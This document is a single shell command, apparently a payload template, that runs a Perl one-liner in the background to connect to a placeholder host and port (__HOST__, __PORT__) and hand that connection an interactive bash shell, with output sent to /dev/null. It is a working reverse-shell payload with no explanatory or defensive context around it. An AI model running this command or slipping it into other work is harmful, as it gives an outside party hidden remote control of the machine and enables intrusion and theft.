/usr/bin/nohup /bin/bash -c 'perl -e '\''use Socket;$i="__HOST__";$p=__PORT__;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");system("/bin/bash -i");};'\''' >/dev/null &